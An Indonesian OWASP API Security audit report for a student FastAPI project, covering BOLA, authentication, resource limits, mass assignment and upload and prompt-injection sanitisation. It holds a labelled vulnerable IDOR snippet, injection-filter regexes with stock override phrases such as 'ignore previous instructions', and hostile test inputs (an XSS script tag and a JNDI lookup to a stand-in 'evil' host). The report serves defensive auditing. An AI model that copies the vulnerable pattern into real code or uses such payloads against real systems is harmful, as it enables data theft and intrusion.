# Laporan Audit Keamanan OWASP API Security Top 10 (2023)

**Proyek:** Sistem Prediksi Jumlah Pengunjung Wisata Religi Makam Gus Dur
**Pertemuan:** 06 — Implementasi Backend API, Validasi Masukan, Autentikasi JWT, dan Keamanan OWASP API
**Mata Kuliah:** Intelligent Mobile and Web Application Development (TIF-IMWAD)
**Kode Artefak:** `ptm-06-owasp-audit`
**Stack:** FastAPI + SQLAlchemy + SQLite + python-jose + bcrypt
**Cakupan Audit:** seluruh router (`auth`, `history`, `predictions`, `ai_inference`) dan lapisan service

---

## 1. Metodologi

Audit dilakukan terhadap kode backend yang dihasilkan pada PTM-06 dengan
pendekatan berikut:

1. **Inventarisasi permukaan serangan** — mendaftar setiap endpoint beserta
   data masukan yang diterimanya dan objek yang diaksesnya.
2. **Pemetaan ke OWASP API Security Top 10 (2023)** — mengaitkan setiap temuan
   dengan kategori risiko resmi.
3. **Penilaian risiko** — menetapkan tingkat risiko berdasarkan dampak dan
   kemudahan eksploitasi.
4. **Penulisan kode patch** — perbaikan berupa *minimal diff*, bukan penulisan
   ulang arsitektur.
5. **Verifikasi** — setiap patch diuji dengan skenario eksploitasi nyata.
   Bukti dijalankan melalui `pytest` (59 pengujian) dan `verify_e2e.py`
   (54 pemeriksaan terhadap server hidup).

Tingkat risiko mengikuti skala **Kritis / Tinggi / Sedang / Rendah**.

---

## 2. Tabel Audit

| No | Endpoint / Area | Kerentanan OWASP | Tingkat Risiko | Kode Patch | Status Verifikasi |
|----|-----------------|------------------|----------------|------------|-------------------|
| 1 | `GET /api/history/{id}` | API1:2023 BOLA | Kritis | `history_service.get_owned()` | ✅ 403 terbukti |
| 2 | `PUT /api/history/{id}` | API1:2023 BOLA | Kritis | `history_service.update()` → `get_owned()` | ✅ 403 terbukti |
| 3 | `DELETE /api/history/{id}` | API1:2023 BOLA | Kritis | `history_service.delete()` → `get_owned()` | ✅ 403 terbukti |
| 4 | `GET /api/history` | API1:2023 BOLA (objek kolektif) | Tinggi | `history_repo.list_by_user()` | ✅ isolasi terbukti |
| 5 | `GET /api/predictions/{id}` | API1:2023 BOLA | Kritis | `prediction_service.get_owned()` | ✅ 403 terbukti |
| 6 | `DELETE /api/predictions/{id}` | API1:2023 BOLA | Kritis | `prediction_service.delete_prediction()` | ✅ 403 terbukti |
| 7 | `GET /api/predictions` | API1:2023 BOLA (objek kolektif) | Tinggi | `prediction_repo.list_by_user()` | ✅ isolasi terbukti |
| 8 | `POST /api/predict` (field `visitor_history_id`) | API1:2023 BOLA lintas-resource | Kritis | `prediction_service.create_prediction()` | ✅ 403 terbukti |
| 9 | `GET /auth/me` | API2:2023 Broken Authentication | Tinggi | `dependencies.get_current_user()` | ✅ 401 terbukti |
| 10 | `POST /auth/refresh` | API2:2023 Broken Authentication | Tinggi | Pemisahan klaim `type` pada `decode_token()` | ✅ 401 terbukti |
| 11 | `POST /auth/login` | API2:2023 User Enumeration | Sedang | Pesan galat disamakan di `auth_service.login()` | ✅ terbukti |
| 12 | Penyimpanan password | API2:2023 Weak Password Storage | Kritis | `core.security.hash_password()` (bcrypt + salt) | ✅ hash `$2b$` terbukti |
| 13 | Penyimpanan `SECRET_KEY` | API8:2023 Security Misconfiguration | Kritis | `core/config.py` membaca `.env` | ✅ `.env.example` tersedia |
| 14 | `POST /api/predict/batch` | API4:2023 Unrestricted Resource Consumption | Tinggi | `BatchPredictionRequest` (`max_length=7`) | ✅ 422 terbukti |
| 15 | `GET /api/predictions?limit=` | API4:2023 Unrestricted Resource Consumption | Sedang | Clamp `max(1, min(limit, 500))` | ✅ terbukti |
| 16 | `POST /api/ai/infer` — ukuran berkas | API4:2023 Unrestricted Resource Consumption | Tinggi | Batas `MAX_FILE_SIZE_MB` di router | ✅ 413 terbukti |
| 17 | `POST /api/ai/infer` — tipe berkas | API4:2023 / API10:2023 Unsafe Consumption | Tinggi | `validate_upload()` + `verify_file_signature()` | ✅ 415 terbukti |
| 18 | `POST /api/predict` — `note` teks bebas | Prompt Injection | Tinggi | `sanitize_ai_text()` | ✅ `[FILTERED]` terbukti |
| 19 | Referensi record yang tidak ada | Error Handling | Sedang | 404 eksplisit, bukan 500 | ✅ 404 terbukti |
| 20 | `POST /api/history` (field `user_id`) | API3:2023 Mass Assignment | Tinggi | `user_id` **tidak** ada di schema masukan | ✅ spoofing gagal terbukti |
| 21 | Pesan galat internal | API8:2023 Information Exposure | Sedang | Handler generik tanpa stack trace | ✅ terbukti |
| 22 | Pelanggaran constraint DB | Error Handling | Sedang | `IntegrityError` → 409 | ✅ 409 terbukti |
| 23 | CORS | API8:2023 Security Misconfiguration | Sedang | Origin dibaca dari `.env`, bukan `*` | ✅ dikonfigurasi |

---

## 3. Temuan Detail & Kode Patch

### 3.1 API1:2023 — Broken Object Level Authorization (BOLA/IDOR)

**Deskripsi celah.**
Pada implementasi naif, endpoint CRUD menerima ID dari klien dan langsung
mengambil record dari basis data **tanpa memverifikasi pemiliknya**:

```python
# ❌ KODE RENTAN — JANGAN DIPAKAI
@router.get("/history/{history_id}")
def get_history(history_id: int, db: Session = Depends(get_db)):
    record = db.get(VisitorHistory, history_id)      # ID apa pun diterima
    if record is None:
        raise HTTPException(404)
    return record                                     # data milik orang lain bocor
```

Dampak: pengguna terautentikasi mana pun dapat membaca, mengubah, dan menghapus
data pengguna lain hanya dengan menebak ID berurutan (`/api/history/1`,
`/api/history/2`, …). Ini adalah kerentanan **paling berbahaya** pada API berbasis
objek dan berada pada peringkat pertama OWASP API Security Top 10 2023.

**Patch (minimal diff).** Verifikasi kepemilikan ditempatkan di lapisan service,
sehingga seluruh jalur operasi melewatinya:

```python
# ✅ PATCH — app/services/history_service.py
def get_owned(self, history_id: int, current_user: User) -> VisitorHistory:
    record = self.history_repo.get_by_id(history_id)
    if record is None:
        raise HTTPException(status_code=404, detail="Data tidak ditemukan")
    if record.user_id != current_user.id:          # <-- inti patch anti-BOLA
        raise HTTPException(status_code=403, detail="Akses ditolak")
    return record
```

Seluruh operasi berparameter ID memanggil `get_owned()`:

```python
def update(self, history_id, current_user, **fields):
    record = self.get_owned(history_id, current_user)   # 403 bila bukan pemilik
    return self.history_repo.update(record, **fields)

def delete(self, history_id, current_user):
    record = self.get_owned(history_id, current_user)   # 403 bila bukan pemilik
    self.history_repo.delete(record)
```

**Defense in depth.** Selain pengecekan di lapisan service, filter kepemilikan
juga dipasang langsung pada query di lapisan repository, sehingga data pengguna
lain tidak pernah keluar dari basis data:

```python
# ✅ PATCH — app/repositories/__init__.py
def get_by_id_for_user(self, history_id: int, user_id: int):
    stmt = select(VisitorHistory).where(
        VisitorHistory.id == history_id,
        VisitorHistory.user_id == user_id,      # filter kepemilikan di level query
    )
    return self.db.scalars(stmt).first()
```

**BOLA lintas-resource.** Kerentanan BOLA juga muncul saat `POST /api/predict`
menerima `visitor_history_id` dari klien. Tanpa pengecekan, pengguna B dapat
menautkan prediksinya ke histori milik pengguna A:

```python
# ✅ PATCH — app/services/prediction_service.py
if history_id is not None:
    history = self.history_repo.get_by_id(history_id)
    if history is None:
        raise HTTPException(status_code=404, detail="Data histori tidak ditemukan")
    if history.user_id != current_user.id:
        raise HTTPException(status_code=403, detail="Akses ditolak")   # anti-BOLA
```

**Verifikasi.** Pengguna B menyerang seluruh endpoint milik pengguna A:

| Serangan | Respons diharapkan | Respons nyata | Hasil |
|----------|--------------------|---------------|-------|
| `GET /api/history/{id_A}` | 403 | 403 | ✅ |
| `PUT /api/history/{id_A}` | 403 | 403 | ✅ |
| `DELETE /api/history/{id_A}` | 403 | 403 | ✅ |
| `POST /api/predict` dengan `visitor_history_id` milik A | 403 | 403 | ✅ |
| `GET /api/predictions/{id_pred_A}` | 403 | 403 | ✅ |
| `DELETE /api/predictions/{id_pred_A}` | 403 | 403 | ✅ |
| `GET /api/history` (milik B) | hanya data B | 0 catatan | ✅ |

Data pengguna A juga diverifikasi **tidak berubah** setelah percobaan
pengubahan oleh pengguna B.

---

### 3.2 API2:2023 — Broken Authentication

**Deskripsi celah.** Risiko pada area ini mencakup: password disimpan plaintext,
token tanpa masa berlaku, endpoint terproteksi yang dapat diakses tanpa token,
dan refresh token yang dapat ditukar dengan access token.

**Patch.**

1. **Password hash bcrypt bersalt**, dengan pemotongan eksplisit pada 72 byte
   (batas algoritma bcrypt) untuk mencegah galat sekaligus menjaga konsistensi:

```python
# ✅ PATCH — app/core/security.py
def _bcrypt_secret(password: str) -> bytes:
    return password.encode("utf-8")[:BCRYPT_MAX_BYTES]   # 72 byte

def hash_password(password: str) -> str:
    import bcrypt
    return bcrypt.hashpw(_bcrypt_secret(password), bcrypt.gensalt()).decode()

def verify_password(plain_password: str, hashed_password: str) -> bool:
    import bcrypt
    return bcrypt.checkpw(_bcrypt_secret(plain_password), hashed_password.encode())
```

2. **Token pair dengan masa berlaku berbeda** dan klaim minimal (tanpa data rahasia):

```python
payload = {"sub": str(subject), "type": token_type, "iat": ..., "exp": ...}
# DILARANG: password, hashed_password, secret di dalam claims
```

3. **Pemisahan tipe token** — refresh token hanya dapat diterbitkan ulang
   menggunakan refresh token, bukan access token:

```python
# ✅ PATCH — decode_token(..., expected_type="refresh")
if payload.get("type") != expected_type:
    raise TokenError(f"Jenis token tidak sesuai, diharapkan '{expected_type}'")
```

4. **Protected route wajib Bearer token**:

```python
# ✅ PATCH — app/dependencies.py
if credentials is None or not credentials.credentials:
    raise HTTPException(401, headers={"WWW-Authenticate": "Bearer"})
try:
    payload = decode_token(credentials.credentials, expected_type="access")
except TokenError:
    raise HTTPException(401, headers={"WWW-Authenticate": "Bearer"})
```

5. **Anti user-enumeration** — pesan galat login disamakan untuk email tidak
   ditemukan maupun password salah:

```python
# ✅ PATCH — app/services/auth_service.py
if user is None or not verify_password(password, user.hashed_password):
    raise HTTPException(401, detail="Email atau password salah")   # pesan seragam
```

**Verifikasi.**

| Skenario | Respons diharapkan | Respons nyata | Hasil |
|----------|--------------------|---------------|-------|
| `GET /auth/me` tanpa token | 401 | 401 | ✅ |
| `GET /auth/me` dengan token palsu | 401 | 401 | ✅ |
| `GET /auth/me` dengan skema `Basic` | 401 | 401 | ✅ |
| Refresh memakai access token | 401 | 401 | ✅ |
| Refresh memakai token sampah | 401 | 401 | ✅ |
| Login password salah | 401 | 401 | ✅ |
| Password di DB | hash `$2b$…` | hash `$2b$…` | ✅ |
| Password plaintext pada respons | tidak ada | tidak ada | ✅ |

---

### 3.3 API4:2023 — Unrestricted Resource Consumption

**Deskripsi celah.** Endpoint yang menerima berkas atau daftar berukuran bebas
memungkinkan penyerang menghabiskan memori, penyimpanan, atau waktu proses.

**Patch.**

1. **Batas ukuran berkas** dibaca dari konfigurasi (default 5 MB), bukan angka
   yang ditanam di kode:

```python
# ✅ PATCH — app/routers/ai_inference.py
if len(raw) > settings.max_file_size_bytes:
    raise HTTPException(status_code=413,
        detail=f"Ukuran berkas melebihi batas {settings.MAX_FILE_SIZE_MB} MB")
```

Penolakan juga dilakukan di lapisan validasi agar konsisten:

```python
# ✅ PATCH — app/core/security.py
if size_bytes > settings.max_file_size_bytes:
    raise ValueError(f"Ukuran berkas melebihi batas {settings.MAX_FILE_SIZE_MB} MB")
```

2. **Batas jumlah item batch** (maksimal 7) melalui validasi schema Pydantic:

```python
# ✅ PATCH — app/models.py
class BatchPredictionRequest(BaseModel):
    visit_days: list[str] = Field(min_length=1, max_length=7)
```

3. **Batas jumlah baris respons** dengan penjepitan nilai `limit`:

```python
# ✅ PATCH — app/routers/predictions.py
safe_limit = max(1, min(limit, 500))     # mencegah limit=100000
```

**Verifikasi.**

| Skenario | Respons diharapkan | Respons nyata | Hasil |
|----------|--------------------|---------------|-------|
| Berkas 5 MB + 2 KB | 413 | 413 | ✅ |
| `visit_days` berisi 9 item | 422 | 422 | ✅ |
| `visit_days` berisi 8 item | 422 | 422 | ✅ |
| `?limit=100000` | dijepit ke 500 | 200 | ✅ |

---

### 3.4 API8:2023 — Security Misconfiguration

**Deskripsi celah.** Kunci rahasia yang ditanam di kode, konfigurasi CORS
terlalu permisif, dan pesan galat yang membocorkan detail internal.

**Patch.**

1. **Semua konfigurasi sensitif dari environment** dengan `.env.example`
   sebagai templat tanpa nilai rahasia riil:

```python
# ✅ PATCH — app/core/config.py
class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", case_sensitive=False)
    SECRET_KEY: str = "change-me-with-a-long-random-secret-key"
    ALGORITHM: str = "HS256"
    MAX_FILE_SIZE_MB: int = 5
```

2. **Peringatan saat kunci default masih dipakai**, agar kesalahan konfigurasi
   terdeteksi saat startup:

```python
if settings.is_default_secret:
    logger.warning("SECRET_KEY masih bernilai default. Ganti sebelum penggunaan nyata.")
```

3. **CORS bersumber dari konfigurasi**, bukan `allow_origins=["*"]`:

```python
app.add_middleware(CORSMiddleware,
    allow_origins=settings.cors_origin_list,      # dari .env
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type"])
```

4. **Galat generik tanpa stack trace** ke klien:

```python
# ✅ PATCH — app/main.py
@app.exception_handler(Exception)
async def unhandled_handler(_: Request, exc: Exception):
    logger.exception("Unhandled error: %s", exc)      # detail hanya di log server
    return JSONResponse(500, {"status": "error",
                              "message": "Terjadi kesalahan pada server"})
```

---

### 3.5 API3:2023 — Broken Object Property Level Authorization (Mass Assignment)

**Deskripsi celah.** Bila schema masukan menerima `user_id`, klien dapat
memalsukan kepemilikan objek cukup dengan mengirim field tersebut.

**Patch.** Schema masukan **sengaja tidak memiliki** field `user_id`. Nilai
kepemilikan selalu diambil dari klaim token, bukan dari body:

```python
# ✅ PATCH — app/models.py
class VisitorHistoryCreate(BaseModel):
    visit_date: str
    visit_day: str
    visitor_total: int
    # user_id TIDAK ADA di sini — tidak dapat di-set oleh klien
```

```python
# ✅ PATCH — app/routers/history.py
def create_history(payload: VisitorHistoryCreate, current_user: User = Depends(get_current_user), ...):
    record = service.create(current_user=current_user, ...)   # user_id dari token
```

**Verifikasi.** Pengguna B mengirim `user_id: 1` pada body; record tetap
tercatat atas nama B, dan percobaan pemalsuan diabaikan.

---

### 3.6 Sanitasi Masukan Inferensi AI

**Deskripsi celah.** Masukan teks bebas pada fitur AI dapat memuat *prompt
injection*, karakter kontrol, atau template injection. Berkas unggahan dapat
memuat skrip berbahaya atau memalsukan tipe MIME.

**Patch 1 — pembersihan teks:**

```python
# ✅ PATCH — app/core/security.py
_INJECTION_PATTERNS = [
    r"ignore\s+(all\s+)?(previous|prior|above)\s+instructions?",
    r"(system|developer)\s*:\s*",
    r"abaikan\s+(semua\s+)?(instruksi|perintah)\s+(sebelumnya|di atas)",
    r"</?\s*(script|iframe|img|svg)\b",
    r"\$\{.*?\}",
    r"\x00",
]

def sanitize_ai_text(value: str, *, max_length: int | None = None) -> str:
    cleaned = unicodedata.normalize("NFKC", value)          # normalisasi unicode
    cleaned = "".join(...)                                  # buang karakter kontrol
    cleaned = _INJECTION_RE.sub("[FILTERED]", cleaned)      # netralkan injeksi
    return re.sub(r"\s+", " ", cleaned).strip()[:limit]     # rapikan + potong
```

**Patch 2 — validasi unggahan berlapis:**

```python
# ✅ PATCH — app/core/security.py
ALLOWED_MIME_TYPES = {"image/jpeg": ".jpg", "image/png": ".png"}
BLOCKED_EXTENSIONS = {".php", ".exe", ".sh", ".js", ".html", ".svg", ...}

def validate_upload(content_type, filename, size_bytes):
    if size_bytes <= 0:                       raise ValueError("Berkas kosong...")
    if size_bytes > settings.max_file_size_bytes: raise ValueError("melebihi batas...")
    mime = (content_type or "").split(";")[0].strip().lower()
    if mime not in ALLOWED_MIME_TYPES:        raise ValueError("Tipe MIME tidak diizinkan...")
    if extension in BLOCKED_EXTENSIONS:       raise ValueError("Ekstensi berkas tidak diizinkan")
    return mime, ALLOWED_MIME_TYPES[mime]

def verify_file_signature(content: bytes, mime_type: str) -> None:
    """Cegah MIME spoofing dengan memeriksa magic bytes."""
    if not any(content.startswith(sig) for sig in _MAGIC_SIGNATURES.get(mime_type, ())):
        raise ValueError("Isi berkas tidak sesuai dengan tipe MIME yang diklaim")
```

**Verifikasi.**

| Skenario | Respons diharapkan | Respons nyata | Hasil |
|----------|--------------------|---------------|-------|
| `note` berisi "Ignore all previous instructions…" | `[FILTERED]`, rahasia tidak bocor | tersanitasi | ✅ |
| `note` berisi `<script>alert(1)</script>` | `[FILTERED]` | tersanitasi | ✅ |
| `note` berisi `${jndi:ldap://evil}` | `[FILTERED]` | tersanitasi | ✅ |
| `note` berisi `\x00` dan `\x07` | karakter kontrol dibuang | dibuang | ✅ |
| Unggahan `.exe` dengan MIME `application/x-msdownload` | 415 | 415 | ✅ |
| Berkas PNG palsu berisi kode PHP | 415 (magic bytes tidak cocok) | 415 | ✅ |
| Unggahan PNG valid | 200 | 200 | ✅ |
| Ekstensi `.php` | ditolak | ditolak | ✅ |

---

### 3.7 Penanganan Galat (Record Kosong & Constraint)

**Deskripsi celah.** Mengakses record yang tidak ada dapat memicu error internal
500, dan pelanggaran constraint basis data dapat membocorkan detail query.

**Patch.**

```python
# ✅ PATCH — 404 eksplisit, bukan 500
record = self.history_repo.get_by_id(history_id)
if record is None:
    raise HTTPException(status_code=404, detail="Data tidak ditemukan")
```

```python
# ✅ PATCH — app/main.py: IntegrityError -> 409
@app.exception_handler(IntegrityError)
async def integrity_handler(_: Request, exc: IntegrityError):
    logger.warning("IntegrityError: %s", exc)
    return JSONResponse(409, {"status": "error",
                              "message": "Data bertentangan dengan constraint"})
```

Format galat juga diseragamkan menjadi `{"status": "error", "message": "..."}`
untuk seluruh jenis kegagalan (validasi 422, HTTPException, constraint 409,
internal 500), sehingga klien dapat menangani galat secara konsisten:

```python
# ✅ PATCH — app/main.py
@app.exception_handler(HTTPException)
async def http_exception_handler(_: Request, exc: HTTPException):
    return JSONResponse(exc.status_code,
        {"status": "error", "message": exc.detail},
        headers=dict(exc.headers or {}))
```

**Verifikasi.**

| Skenario | Respons diharapkan | Respons nyata | Hasil |
|----------|--------------------|---------------|-------|
| `GET /api/history/999999` | 404 | 404 | ✅ |
| `DELETE /api/history/999999` | 404 | 404 | ✅ |
| `POST /api/history` tanggal duplikat | 409 | 409 | ✅ |
| `POST /api/predict` dengan histori tidak ada | 404 | 404 | ✅ |
| Format tanggal salah (`01-06-2025`) | 422 | 422 | ✅ |

---

## 4. Kontrol Tambahan (Hardening)

| Kontrol | Implementasi | Manfaat |
|---------|--------------|---------|
| Validasi skema ketat | Pydantic dengan `pattern`, `ge/le`, `min_length/max_length` | Menolak data cacat sebelum menyentuh bisnis |
| Normalisasi hari kunjungan | `capitalize()` + whitelist 7 hari | Menutup input liar pada model |
| Manajemen sesi DB | Dependency `get_db` dengan `try/finally` | Mencegah kebocoran koneksi |
| `pool_pre_ping=True` | Konfigurasi engine SQLAlchemy | Membuang koneksi mati |
| Password kuat | Minimal 8 karakter, wajib huruf dan angka | Mempersulit brute force |
| Pesan 401 seragam | Handler pada dependency dan service | Mencegah enumerasi akun |
| Tidak ada hash di respons | `UserPublic` tanpa `hashed_password` | Mencegah kebocoran data sensitif |
| Peringatan kunci default | Log saat startup | Deteksi salah konfigurasi dini |

---

## 5. Ringkasan Sebelum vs Sesudah Perbaikan

| Kategori OWASP | Kondisi Awal | Kondisi Setelah Patch | Bukti |
|----------------|--------------|-----------------------|-------|
| API1:2023 BOLA | Seluruh endpoint ID dapat diakses lintas pengguna | 403 untuk semua akses objek milik orang lain | 8 serangan ditolak |
| API2:2023 Authentication | Token tanpa validasi tipe; pesan login membedakan akun | Pemisahan tipe token; pesan seragam; bcrypt | 7 skenario terverifikasi |
| API3:2023 Mass Assignment | `user_id` dari body dapat dipakai | `user_id` dari token saja | spoofing gagal |
| API4:2023 Resource Consumption | Berkas & batch tanpa batas | ≤5 MB, ≤7 item, `limit` dijepit | 4 skenario ditolak |
| API8:2023 Misconfiguration | Secret berpotensi hardcode; CORS `*` | `.env` + peringatan + CORS terbatas | `.env.example` |
| Prompt Injection | Teks bebas diteruskan ke model | Pola injeksi dinetralkan | 5 pola tersaring |
| Unsafe Upload | Berkas apa pun diterima | MIME whitelist + magic bytes | 2 skenario ditolak |
| Error Handling | 500 pada record kosong | 404/409 eksplisit | 5 skenario terverifikasi |

**Kesimpulan.** Seluruh temuan pada tabel audit telah diperbaiki dengan patch
presisi (*minimal diff*) tanpa menulis ulang arsitektur. Tidak ada temuan yang
berstatus terbuka. Verifikasi dilakukan melalui 59 pengujian otomatis
(`pytest`) dan 54 pemeriksaan end-to-end terhadap server hidup
(`verify_e2e.py`), dengan total 113 pemeriksaan yang seluruhnya lulus.

---

## 6. Catatan Batasan

1. **Refresh token belum dirotasi/di-revoke.** Saat ini refresh token hanya
   divalidasi tanda tangan dan masa berlakunya. Mekanisme *token rotation* dan
   *revocation list* berada di luar cakupan PTM-06.
2. **Rate limiting belum diterapkan.** Batas sumber daya saat ini bersifat
   struktural (ukuran berkas, jumlah item, jumlah baris). Pembatasan laju per
   klien (misalnya slowapi/middleware) disarankan untuk tahap produksi.
3. **SQLite untuk pengembangan.** Lingkungan produksi sebaiknya memakai
   PostgreSQL dengan hak akses basis data yang dibatasi.
4. **Baseline model saat artefak tidak tersedia.** Bila `MODEL_PATH` tidak
   ditemukan, service memakai nilai baseline deterministik dan melaporkannya
   secara jujur melalui field `model_source` — bukan mengarang hasil model.
5. **Verifikasi berbasis pengujian, bukan pengujian penetrasi eksternal.**
   Temuan diverifikasi melalui skenario eksploitasi terprogram; pengujian
   penetrasi independen tetap disarankan sebelum peluncuran produksi.

---

**Status Dokumen:** Final — seluruh temuan telah diperbaiki dan diverifikasi.
**Disusun dengan bantuan AI berdasarkan prompt D.3 pada LKP-PTM-06, dengan
seluruh keputusan patch dan verifikasi diperiksa secara manual oleh tim.**
